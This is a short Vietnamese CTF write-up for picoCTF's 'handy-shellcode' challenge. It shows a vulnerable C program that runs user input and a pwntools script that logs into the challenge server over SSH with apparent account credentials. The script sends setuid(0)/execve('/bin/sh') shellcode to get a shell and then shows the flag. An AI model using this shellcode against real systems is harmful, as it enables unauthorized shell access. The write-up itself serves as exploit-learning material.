#Đây là 1 bài dễ

Đây là code của chương trình:
 
```
sh
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```
Bài này rất dễ. 
Mình chỉ cần chọn shellcode hợp lí nhất.
Ở đây mình lấy 1 shellcode: setuid(0) và sao đó là shell "/bin/sh". Vì sao phải dùng setuid(0), vì chương trình đã setuid ngăn không cho mình thực thi "/bin/sh" nên chúng ta sẽ cho nó về giá trị mặc định.

Đây là file exploit của mình:

```sh
from pwn import *

#s = process("./vuln")
s = ssh(host= '2019shell1.picoctf.com',user = 'hazir',password = '2k4')
r = s.run("cd /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5; ./vuln")
raw_input("Debug")
	# Padding goes here
p= '''\x31\xC0\x31\xDB\x31\xC9\xB0\x17\xCD\x80\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x8D\x54\x24\x08\x50\x53\x8D\x0C\x24\xB0\x0B\xCD\x80\x31\xC0\xB0\x01\xCD\x80'''

r.sendline(p)
r.interactive()
r.close()
```

- Và boom, ta được gì sau khi chạy ` picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487} `